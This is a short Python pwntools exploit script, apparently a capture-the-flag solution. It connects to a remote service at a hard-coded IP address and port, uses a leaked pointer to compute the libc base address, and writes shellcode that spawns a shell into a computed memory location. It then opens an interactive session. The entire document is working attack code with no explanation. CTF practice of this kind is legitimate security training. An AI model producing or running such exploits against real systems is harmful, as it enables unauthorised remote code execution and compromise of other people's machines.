from pwn import *
context.arch='amd64'
context.log_level='debug'
p=remote("43.155.72.106",9998)
#p=process("./pwn")
p.readuntil(": ")
base=int(p.readline(),16)-(0x7ffff7dce760-0x00007ffff79e2000)
log.warning(hex(base))
p.sendlineafter(": ",hex(0x00007ffff7dcf000-0x00007ffff79e2000+base)[2:])
#gdb.attach(p,'b *0x000555555554B0F')
p.sendlineafter("? ",str(0x5000))
p.sendlineafter(": ",str(0x0))
sh=asm(shellcraft.sh())
p.sendlineafter("\n",sh)
p.sendlineafter("?\n",hex(0x00007ffff7dcf000-0x00007ffff79e2000+base)[2:])
p.interactive()